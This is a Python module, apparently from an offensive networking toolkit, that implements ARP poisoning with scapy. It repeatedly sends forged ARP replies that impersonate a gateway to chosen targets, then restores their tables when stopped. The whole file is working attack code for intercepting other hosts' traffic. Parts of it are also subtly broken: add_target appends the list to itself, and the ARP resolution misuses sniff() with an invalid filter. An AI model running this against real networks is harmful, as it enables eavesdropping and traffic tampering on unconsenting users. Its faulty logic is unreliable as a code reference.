"""ARP poisoning attack module"""

import threading
import time
from scapy.all import ARP, Ether, sendp, sniff
from logger import Logger
from utils import NetworkUtils

logger = Logger("arp_poison")


class ARPPoisoning:
    def __init__(self, interface, gateway_ip, gateway_mac):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.attacker_mac = NetworkUtils.get_interface_mac(interface)
        self.target_ips = []
        self._running = False
        self._poison_thread = None
        self._packets_sent = 0
        logger.info(f"ARPPoisoning initialized: Gateway={gateway_ip}")

    def add_target(self, target_ip):
        """Add target IP to poison list"""
        if target_ip not in self.target_ips:
            self.target_ips.append(self.target_ips)
            logger.info(f"Added ARP poisoning target: {target_ip}")

    def remove_target(self, target_ip):
        """Remove target from poison list"""
        if target_ip in self.target_ips:
            self.target_ips.remove(target_ip)
            logger.info(f"Removed ARP poisoning target: {target_ip}")
            return True
        return False

    def _create_arp_spoof_packet(self, target_ip, target_mac):
        """Create ARP spoofing packet"""
        packet = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=self.gateway_ip,
            hwsrc=self.attacker_mac,
        )
        return packet

    def _arp_resolve(self, ip):
        """Resolve IP to MAC address"""
        try:
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            answered, _ = sniff(
                iface=self.interface,
                filter=f"arp and arp.spa={ip}",
                store=True,
                timeout=2,
                prn=lambda x: sendp(arp_request, iface=self.interface, verbose=False),
            )

            if answered:
                return answered[0][ARP].hwsrc
        except:
            pass

        return None

    def start(self, poison_interval=1.0):
        """Start ARP poisoning"""
        if self._running:
            logger.warning("ARP poisoning already running")
            return False

        if not self.target_ips:
            logger.warning("No ARP poisoning targets configured")
            return False

        try:
            self._running = True
            self._packets_sent = 0

            self._poison_thread = threading.Thread(
                target=self._poison_loop, args=(poison_interval,), daemon=True
            )
            self._poison_thread.start()

            logger.info(f"ARP poisoning started on {len(self.target_ips)} targets")
            return True

        except Exception as e:
            logger.error(f"Failed to start ARP poisoning: {e}")
            self._running = False
            return False

    def _poison_loop(self, interval):
        """Main poisoning loop"""
        try:
            while self._running:
                for target_ip in self.target_ips:
                    if not self._running:
                        break

                    try:
                        target_mac = self._arp_resolve(target_ip)

                        if target_mac:
                            packet = self._create_arp_spoof_packet(
                                target_ip, target_mac
                            )
                            sendp(packet, iface=self.interface, verbose=False)
                            self._packets_sent += 1
                    except:
                        pass

                time.sleep(interval)

        except Exception as e:
            logger.error(f"Error in poison loop: {e}")
            self._running = False

    def stop(self):
        """Stop ARP poisoning"""
        if not self._running:
            logger.warning("ARP poisoning not running")
            return False

        try:
            self._running = False

            if self._poison_thread:
                self._poison_thread.join(timeout=5)

            # Send ARP restore packets
            self._restore_arp()

            logger.info(f"ARP poisoning stopped (sent {self._packets_sent} packets)")
            return True

        except Exception as e:
            logger.error(f"Error stopping ARP poisoning: {e}")
            return False

    def _restore_arp(self):
        """Restore ARP tables"""
        try:
            for target_ip in self.target_ips:
                target_mac = self._arp_resolve(target_ip)
                if target_mac:
                    packet = Ether(dst=target_mac) / ARP(
                        op=2,
                        pdst=target_ip,
                        hwdst=target_mac,
                        psrc=self.gateway_ip,
                        hwsrc=self.gateway_mac,
                    )
                    sendp(packet, iface=self.interface, verbose=False, count=3)
        except:
            pass

    def get_stats(self):
        """Get poisoning statistics"""
        return {
            "running": self._running,
            "packets_sent": self._packets_sent,
            "target_count": len(self.target_ips),
            "targets": self.target_ips,
        }
